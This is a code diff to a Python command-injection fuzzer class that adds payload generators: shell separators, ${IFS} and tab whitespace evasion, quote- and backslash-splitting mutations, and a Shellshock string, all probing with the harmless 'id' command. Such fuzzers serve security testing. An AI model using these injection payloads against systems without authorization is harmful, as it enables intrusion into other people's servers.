@@ -80,23 +80,46 @@ class CmdInjection(Fuzzer):
         '/bin',
     ]
 
-    def __init__(self):
+    whitespaces = ["${IFS}", "+", "\x09", "\x0b", " "]
+
+    def __init__(self, os='linux', shell='bash'):
         super(CmdInjection, self).__init__()
+        self.os = os
+        self.shell = shell
 
     @classmethod
     def test(cls, cmd="id"):
         # some system do not have id
         return [
             "|%s" % cmd,
+            "||%s" % cmd,
+            "&%s" % cmd,
+            "&&%s" % cmd,
+            " | %s" % cmd,
+            " || %s" % cmd,
+            " & %s" % cmd,
+            " && %s" % cmd,
             "=%s|'%s'!''" % (cmd, cmd),
             ";%s" % cmd,
             ");%s" % cmd,
             ";%s#" % cmd,
             "\n%s" % cmd,
+            "\r%s" % cmd,
+            "\r\n%s" % cmd,
             "`%s`" % cmd,
             "$(%s)" % cmd,
             "${%s}" % cmd,
+            "{%s}" % cmd,
             "\x00`%s`" % cmd,
+        ]
+
+    @classmethod
+    def mutate(cls, cmd):
+        return [
+            "'".join(list(cmd)),
+            '"'.join(list(cmd)),
+            '\\'.join(list(cmd)),
+            cmd.replace(' ', '$IFS'),
         ]
 
     @classmethod
@@ -107,3 +130,7 @@ class CmdInjection(Fuzzer):
             "/u??/bin/id",
             "a=i;b=d;$a$b",
         ]
+
+    @classmethod
+    def shellshock(cls):
+        return '() { :;}; /usr/bin/id'
